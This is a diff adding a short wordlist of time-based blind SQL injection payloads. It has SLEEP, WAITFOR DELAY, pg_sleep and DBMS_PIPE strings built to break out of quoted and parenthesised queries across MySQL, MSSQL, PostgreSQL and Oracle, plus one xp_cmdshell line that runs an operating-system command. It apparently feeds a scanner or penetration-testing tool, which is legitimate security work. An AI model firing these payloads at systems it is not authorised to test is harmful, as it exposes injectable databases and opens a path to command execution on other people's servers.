@@ -1,0 +1,27 @@
+# Time-Based Blind SQL Injection Payloads
+# If vulnerable, response will be delayed by the specified seconds
+'; SELECT SLEEP(5)--
+'; SELECT SLEEP(3)--
+' AND SLEEP(5)--
+' AND SLEEP(3)--
+' OR SLEEP(5)--
+1; SELECT SLEEP(5)--
+1 AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:3'--
+1; WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+'; SELECT pg_sleep(3)--
+' AND 1=1; SELECT SLEEP(5)--
+' OR 1=1 WAITFOR DELAY '0:0:5'--
+1); SELECT SLEEP(5)--
+1); WAITFOR DELAY '0:0:5'--
+') OR SLEEP(5)--
+') AND SLEEP(5)--
+'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--
+'; SELECT 1 FROM (SELECT SLEEP(5)) t--
+' AND (SELECT 1 FROM (SELECT SLEEP(5)) t)--
+1 OR SLEEP(5)--
+1 OR pg_sleep(5)--
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
